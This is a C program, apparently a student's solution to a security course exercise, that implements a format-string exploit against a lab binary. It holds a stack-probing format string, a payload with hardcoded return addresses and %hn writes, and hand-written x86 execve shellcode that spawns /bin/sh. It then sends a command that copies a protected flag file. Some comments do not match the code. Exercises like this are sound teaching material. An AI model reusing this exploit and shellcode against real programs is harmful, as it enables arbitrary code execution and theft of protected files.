/* 
 * Attack 03 - Fill out this program to implement your attack for Problem 3
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  char examining []="%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 10
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 20
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 30
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 40
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 50
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 60
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" // 70
                    "%9x%9x%9x%9x%9x" // 76
                    "";

  //buffer's address starts at 0xbffff628
  // our eip exploit  portion is 44 bytes
  // /bin/sh section starts at 0xbffff f654
  char injection [] = "\x3e\xf7\xff\xbf" // 0xbffff73e - 4 bytes
                      "\x41\x41\x41\x41" // AAAA       - 4 bytes
                      "\x3c\xf7\xff\xbf" // 0xbffff73c - 4 bytes
                      "%9x%9x%9x%9x%49103x" //pop stack and set width - 18 bytes
                      "%hn" //write 4 bytes            - 3 bytes
                      "%13909x" // increase width      - 7 bytes
                      "%hn" // write 4 more bytes      - 3 bytes = 44
                      "\xeb\x21" // jump 0x1d
                      "\x5b" // pop ebx 
                      "\x89\x5b\x0E" // mov %ebx, 0xE(%ebx)
                      "\x31\xc0" // xor %eax,%eax
                      "\x88\x43\x07" // mov %al,0x7(%ebx)
                      "\x89\x43\x12" // mov %eax,0xE(%ebx)
                      "\xb0\x08" // mov 8,%eax (interup 11)
                      "\x40\x40\x40" // increment %eax 2 times. 
                      "\x8d\x4b\x0E" // leal 0xe(%ebx),%ecx
                      "\x8d\x53\x12" // leal 0x12(%ebx),%edx
                      "\xcd\x80" // interupt 80 execve
                      "\x31\xc0" // xor 
                      "\x89\xc3" // mov
                      "\x40"     // increment
                      "\xcd\x80"// interupt 80 execve
                      "\x90"   // NO-OP to fit
                      "\xe8\xda\xff\xff\xff" // call
                      "\x2f\x62\x69\x6e\x2f\x73\x68\x41" // /bin/sh 
                      "";

  char shell_command [] = "cat /home/flags/hw03/flag05.txt > flag05.txt"; 
  puts(injection);
  fflush(stdout);
  sleep(1);
  puts(shell_command);

  return 0;
}
